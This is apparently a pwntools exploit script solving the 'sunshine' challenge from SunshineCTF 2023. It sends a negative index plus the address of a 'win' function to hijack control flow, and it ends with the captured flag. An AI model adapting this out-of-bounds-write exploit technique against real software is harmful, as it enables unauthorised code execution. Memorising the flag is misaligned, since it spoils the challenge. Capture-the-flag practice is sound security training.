# Credit: Ashok Gaire's writeup assisted with locating the memory address for
# new stack @ beginning of user input buffer.
# https://ashokgaire.github.io/posts/SpacePwn/

from pwn import *

# Same syntax as python2
# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
context.binary = "./sunshine"
binary = ELF("sunshine")
#libc = ELF("libc.so.6")

# Same syntax as python2
#p = remote("chal.2023.sunshinectf.games", 23003)
#p = process("./sunshine")
p = gdb.debug("./sunshine", '''
break *main
break *basket
break *basket+253
''')

opt1 = b'-8'
eip = '\x42' * 6

main = 0x401670
win = 0x40128f

payload = opt1 + p64(win)

p.sendline(payload)
p.interactive()

# sun{a_ray_of_sunshine_bouncing_around}
